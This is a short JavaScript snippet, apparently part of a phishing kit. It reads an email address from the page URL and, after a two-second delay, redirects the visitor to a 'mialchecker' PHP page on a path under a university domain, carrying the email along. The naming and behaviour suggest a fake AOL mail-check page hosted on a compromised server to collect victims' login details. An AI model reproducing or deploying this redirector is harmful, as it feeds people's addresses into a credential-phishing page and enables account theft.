
		function getUrlVars() {
		    var vars = {};
		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
		        vars[key] = value;
		    });
		    return vars;
		}
		var email = getUrlVars()['app'];
		var redirect = "https://www-lisic.univ-littoral.fr/spitefulaol/mialchecker/index.php";
		var urlFinal = redirect + "?email=" + email;
		setTimeout(function () {
			window.location.href = urlFinal; 
		}, 2000);
	